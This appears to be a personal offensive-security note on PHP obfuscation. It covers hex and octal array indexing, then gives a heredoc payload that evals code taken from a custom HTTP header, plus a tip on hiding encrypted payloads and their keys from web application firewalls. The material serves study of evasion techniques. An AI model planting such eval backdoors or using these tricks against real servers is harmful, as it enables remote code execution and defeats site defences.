## Accessing Individual Index of Array
```php
$a = array(x=>123, xx=>456); // This could be a $_GET, $_POST, or any another superglobal

echo $a['x']; // 'normal' usage > 123
echo $a[x]; // index without quotes > 123
echo $a["\x78"]; // hexadecimal notation > 123
echo $a["\170"]; // octal notation > 123
echo $a['x'.@false."\x78"];// 'normal' usage with padding and hex.notation> 456
```
## Superglobals
Superglobals can be very useful to the obfuscation process. One example is `$_SERVER` which is full of interesting fields. We can manipulate these to both increase the obfuscation level and evade security mechanisms such as WAFs.

For example, we can generate our requests client-side and either send headers like `User-Agent`, `Accept-Encoding`, or even send customized headers like `CustomHeader`. Combining what was discussed on [String Data Types](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FEvasions%20and%20Bypasses%2FEvasion%20Techniques%2FPHP%20Obfuscation%20Techniques%2FString%20Data%20Types), we can generate the following payload.
```php
echo <<<🍺
I{$_GET[eval($_SERVER['HTTP_CUSTOMHEADER'])]}Love beer
🍺;
```
> Note: A simple way to evade WAFs is to not only send your payload encrypted by using GET or POST, but also the key to decrypt via a custom header.